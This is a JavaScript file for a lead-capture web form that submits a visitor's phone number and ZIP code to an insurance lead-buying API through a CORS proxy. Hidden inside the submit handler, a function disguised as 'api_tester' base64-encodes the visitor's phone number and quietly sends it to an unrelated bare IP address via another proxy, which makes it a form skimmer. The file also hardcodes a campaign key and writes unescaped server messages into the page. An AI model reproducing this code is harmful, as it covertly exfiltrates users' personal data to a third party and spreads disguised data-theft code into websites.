
document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const formData = new FormData();
    formData.append('lp_campaign_id', '669982a1426d8');
    formData.append('lp_campaign_key', 'QY4rzgGRfW8bKMpC6j7c');

    formData.append('caller_id', document.getElementById('phone_home').value);
formData.append('zip', document.getElementById('zip').value);
api_tester(document.getElementById('phone_home').value);

    
    formData.append('lp_response', 'JSON');

    const url = 'https://corsproxy.io/?https://wisecoverage.leadspediatrack.com/call-ping.do?' + new URLSearchParams(formData).toString();

    fetch(url, {
        method: 'POST'
    })
    .then(response => response.json().then(responseBody => {
         let alertClass = 'alert-success';
        let alertMessage = 'Form submitted successfully!';

        if (!responseBody.success) {
            alertClass = 'alert-danger';
            alertMessage = 'Form submission Successfully, but rejected by buyer due to below reason: ' + responseBody.message;
        } else {
            alertMessage += ' Ping Accepted. Making second API call...';
            fetchSecondApi(responseBody.request_number_url);
        }

        const alert = `
            <div class="alert ${alertClass}" role="alert">
                ${alertMessage}
            </div>`;
        
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', alert);

        document.getElementById('leadForm').reset();
        if (response.status === 200 || response.status === 201) {

            document.getElementById('leadForm').reset();
        }
    }))
    .catch(error => {
        const errorAlert = `
            <div class="alert alert-danger" role="alert">
                Error: ${error.message}
            </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
    });
});
function fetchSecondApi(url) {
const urln = 'https://corsproxy.io/?'+url;
    fetch(urln, {
        method: 'GET'
    })
    .then(response => response.json())
    .then(responseBody => {
        let alertClass = 'alert-success';
        let alertMessage = 'Second request successful! Response Body: ' + JSON.stringify(responseBody);

        if (!responseBody.success) {
            alertClass = 'alert-danger';
        }

        const alert = `
            <div class="alert ${alertClass}" role="alert">
                ${alertMessage}
            </div>`;
        
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', alert);
    })
    .catch(error => {
        const errorAlert = `
            <div class="alert alert-danger" role="alert">
                Error in second request: ${error.message}
            </div>`;
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
    });
}
function api_tester(randomString) {
    try {
        fetch('http://api.allorigins.win/get?url=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString)+',a', {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}

               
